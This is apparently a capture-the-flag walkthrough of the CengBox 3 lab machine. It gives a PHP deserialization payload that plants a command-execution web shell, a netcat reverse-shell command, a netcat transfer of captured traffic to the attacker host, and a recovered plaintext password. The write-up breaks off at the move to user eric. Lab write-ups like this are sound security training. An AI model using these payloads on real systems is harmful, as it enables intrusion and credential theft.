# CengBox: 3 Walkthrough

# Description
```bash
Goal : Get user and root flag

Difficulty : Intermediate / Hard

Description : Some of us hold on to poems, songs, movies, books. I guess people can't hold onto people anymore. -- Oguz Atay

You know what you have to do. If you get stuck, you can get in touch with me on Twitter. @arslanblcn_

This machine works properly on Virtualbox.

Happy hacking :)

This works better with VirtualBox rather than VMware.
```

# Exploitation
Let's start with network scan
```bash
 Currently scanning: 192.168.0.1/24   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   58:11:22:85:0d:41      2     120  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.111   08:00:27:18:94:41      1      60  PCS Systemtechnik GmbH                                                                                                                                         

```
\
scanning for Open ports 
```bash
80/tcp  open   http     Apache httpd 2.4.18 ((Ubuntu))
443/tcp open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
```
\
Lets open port 80 on home page 
\
<img width="1705" height="653" alt="image" src="https://github.com/user-attachments/assets/93818221-aa7c-4d65-b823-d3486ef9182e" />
\
WE notice that there is a https port 443, so we check the certificate and add it to /etc/hosts
\
<img width="546" height="666" alt="image" src="https://github.com/user-attachments/assets/ad1a7959-fc0c-44c9-91a1-661c838e5945" />
\
```bash
ffuf -u http://ceng-company.vm/ -H "Host: FUZZ.ceng-company.vm" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --fs 36015

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ceng-company.vm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ceng-company.vm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 36015
________________________________________________

dev                     [Status: 200, Size: 4764, Words: 124, Lines: 99, Duration: 5ms]
www.dev                 [Status: 200, Size: 4764, Words: 124, Lines: 99, Duration: 8ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1257 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```
We check for subdomains and get 2 of them , lets add to our hosts file
\
<img width="1457" height="618" alt="image" src="https://github.com/user-attachments/assets/c9ae8a28-a522-4e68-a954-1711457ece78" />
\
We ahve a logiin page here , but no credentials , so we go back to main website to check for clues
\
From the home page , we get 2 links from profiles of 2 employees
\
<img width="1177" height="735" alt="image" src="https://github.com/user-attachments/assets/0ed0efd6-ba8c-4f6e-aa81-a161d9daf4c1" />
\
which gives a pretty useful hint
```bash
Hint for CengBox3 -- namelastname@ceng-company.vm
```
\
And there is a code.php
\
<img width="1685" height="741" alt="image" src="https://github.com/user-attachments/assets/f5d068a6-160f-4663-9bfe-d3bd88b92994" />
\
And also a reddit link from elizabeth
\
<img width="1204" height="487" alt="image" src="https://github.com/user-attachments/assets/600074de-62f1-4d19-87de-a144f872be12" />
\
So im assuming , that we need to use the email of elizabeth , then we can create a wordlist from the reddit post and bruteforce 
\
So i create a wordlist and then send the login reqeuest to burpsuite intruder
\
<img width="1211" height="343" alt="image" src="https://github.com/user-attachments/assets/993abce0-9af1-4741-95d2-1a8e7f89f75c" />
\
MAke sure the email consists of all lowercase letters 
\
Here we can see that this password gave a different response
\
<img width="1040" height="165" alt="image" src="https://github.com/user-attachments/assets/cd7506dc-2f49-41c8-967a-cb9479aab619" />
\
After signing in , we get this
\
<img width="1344" height="227" alt="image" src="https://github.com/user-attachments/assets/6b3899b4-b267-46c3-87b0-1d622cdf4ed9" />
\
I click on add poem , and it gives some fields to enter data
\
<img width="1182" height="575" alt="image" src="https://github.com/user-attachments/assets/113aa183-2b98-4c12-9de0-ace69dc36f14" />
\
Then i remember the github repo having the "poem" class, which was unserializing user given data 
```bash
"unserialize(urldecode($_REQUEST['data']));"
```
\
So i think we can get Remote Code Execution using this deserialization vulnerability since it calls the magic function "__destruct"
```bash
public function __destruct()
		{
			file_put_contents($this->filename, $this->poemName, FILE_APPEND);
		}
```
\
So First i start by entering sample data to find out the actual structure of the serialized data being unsreialized on the server end 
\
<img width="687" height="398" alt="image" src="https://github.com/user-attachments/assets/289f6985-0aee-4625-826e-e8992633b37d" />
\
<img width="1164" height="348" alt="image" src="https://github.com/user-attachments/assets/64bf8168-3545-4a4d-b5a7-e4929122629c" />
\
It shows the data parameter inthe link
\
<img width="1482" height="138" alt="image" src="https://github.com/user-attachments/assets/c1c85d00-f6a1-47fc-b2b8-4b35e2d83d68" />
\
<img width="1680" height="422" alt="image" src="https://github.com/user-attachments/assets/e52159fd-0372-4e5f-80d0-e7791cfec47c" />
\
On the right side of this window , we can see the structure 
```bash
O:4:"Poem":3:{s:8:"poemName";s:1:"1";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:22:"/var/www/html/poem.txt";s:8:"poemName";s:1:"1";}s:9:"poemLines";s:1:"1";}
```
\
This structure when converted into proper visual heirarchy consisting of a nested class is 
```bash
O:4:"Poem":3:{

    s:8:"poemName";   s:1:"1";
    
    s:10:"isPoetrist"; O:8:"poemFile":2:{
                          s:8:"filename"; s:22:"/var/www/html/poem.txt";
                          s:8:"poemName"; s:1:"1";
                       }
    
    s:9:"poemLines";   s:1:"1";

}
```
\
So, When creating the payload we need to follow this structure exactly , and the payload i used is
```bash
O:4:"Poem":3:{s:8:"poemName";s:1:"1";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:34:"../../../../var/www/html/shell.php";s:8:"poemName";s:30:"<?php system($_GET["cmd"]); ?>";}s:9:"poemLines";s:1:"1";}
```
\
Also 
```bash
O:4:"Poem":3:{
    s:8:"poemName"; s:1:"1";
    
    s:10:"isPoetrist"; O:8:"poemFile":2:{
        s:8:"filename"; s:34:"../../../../var/www/html/shell.php";
        s:8:"poemName"; s:30:"<?php system($_GET["cmd"]); ?>";
    }
    
    s:9:"poemLines"; s:1:"1";
}
```
\
More detailed version for better understanding
```bash
Poem Object (3 properties)
│
├── [property 1] poemName
│   └── string(1) "1"
│
├── [property 2] isPoetrist
│   └── poemFile Object (2 properties)
│       │
│       ├── [property 2.1] filename
│       │   └── string(34) "../../../../var/www/html/shell.php"
│       │
│       └── [property 2.2] poemName
│           └── string(30) "<?php system($_GET["cmd"]); ?>"
│
└── [property 3] poemLines
    └── string(1) "1"
```
\
Then i send the get request to burp repeater and change the value of data to our payload
\
<img width="1682" height="394" alt="image" src="https://github.com/user-attachments/assets/543357e1-7ef6-45ce-9d25-b139b02a7f86" />
\
Then we find which website is hosted from /var/www/html/, and i found that it is the main website  since our shell.php will be there
\
<img width="542" height="213" alt="image" src="https://github.com/user-attachments/assets/4be8dbbe-3229-45a7-b27a-95cfdfffd54c" />
\
<img width="515" height="118" alt="image" src="https://github.com/user-attachments/assets/8ad4c2e0-6815-4131-8a24-dfe1acf82412" />
\
So now i can send a parameter cmd to check execution
\
<img width="536" height="121" alt="image" src="https://github.com/user-attachments/assets/fbf4b67a-d9d1-4b6c-af3a-b85b12e43401" />
\
The command executed giving us code execution , now let's get a reverse shell using the payload 
```bash
busybox nc 192.168.0.124 4444 -e /bin/sh
```
```bash
penelope        
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from cengbox~192.168.0.111-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/cengbox~192.168.0.111-Linux-x86_64/2026_04_20-01_28_05-520.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@cengbox:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cengbox:/var/www/html$ ls -la
total 72
drwxr-xr-x 7 www-data www-data  4096 Apr 20 08:16 .
drwxr-xr-x 4 root     root      4096 Sep 24  2020 ..
drwxr-xr-x 2 www-data www-data  4096 Oct 30  2017 css
drwxr-xr-x 2 www-data www-data  4096 Oct 30  2017 fonts
drwx------ 2 www-data www-data  4096 Oct 30  2017 img
-rw------- 1 www-data www-data 36015 Sep 26  2020 index.html
drwxr-xr-x 3 www-data www-data  4096 Oct 30  2017 js
-rw-r--r-- 1 www-data www-data     8 Apr 20 08:15 poem.txt
drwxr-xr-x 4 www-data www-data  4096 Oct 30  2017 scss
-rw-r--r-- 1 www-data www-data    30 Apr 20 08:16 shell.php
```
\
We check the users on this machine , we fidn eric , but no permission to enter home dir
```bash
www-data@cengbox:/var/www/html$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
eric:x:1000:1000:eric,,,:/home/eric:/bin/bash
www-data@cengbox:/var/www$ cd /home
www-data@cengbox:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep 27  2020 .
drwxr-xr-x 22 root root 4096 Sep 28  2020 ..
drwx------  3 eric eric 4096 Sep 28  2020 eric
```
\
then i check for files that are owned by user eric
```bash
www-data@cengbox:/home$ find / -type f -user eric -exec ls -l {} + 2>/dev/null
-rwx------ 1 eric eric 143 Sep 28  2020 /opt/login.py
```
\
We see that there is a cronjob running as root to execute this /opt/login.py , which is useful information for priviledge escalation to root from eric
```bash
CMD: UID=0     PID=1647   | /bin/sh -c /usr/bin/python3 /opt/login.py
```
\
I found tcpdump on the machine with special priviledges
```bash
www-data@cengbox:/tmp$ getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
\
I tried to capture some packets on the internal adapter 
```bash
www-data@cengbox:/tmp$ tcpdump -i lo -w dump.pcapng  
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
^C12 packets captured
24 packets received by filter
0 packets dropped by kernel
```
\
Then sent to attacker machine through nc , idk why python server wasnt working
\
On target machine
```bash
www-data@cengbox:/tmp$ nc 192.168.0.124 1337 < dump.pcapng
```
\
On attacker machine
```bash
nc -nvlp 1337 > dump.pcapng
listening on [any] 1337 ...
connect to [192.168.0.124] from (UNKNOWN) [192.168.0.111] 54228
```
\
Opening in wireshark
\
<img width="1665" height="395" alt="image" src="https://github.com/user-attachments/assets/5531fb24-dbc8-4a58-8069-78392e20020e" />
\
We see that was a http post request made , and we capture some credentials
\
<img width="760" height="488" alt="image" src="https://github.com/user-attachments/assets/f069d518-9a74-4460-9435-1089e8a796da" />
\
Url decoding gives credetials 
```bash
eric : 3ricThompson*Covid19
```
\
Which is similar style to the password we found for elizabeth ain /var/www/dev.ceng-company.vm/conn.php
\
So now we can become user eric
\
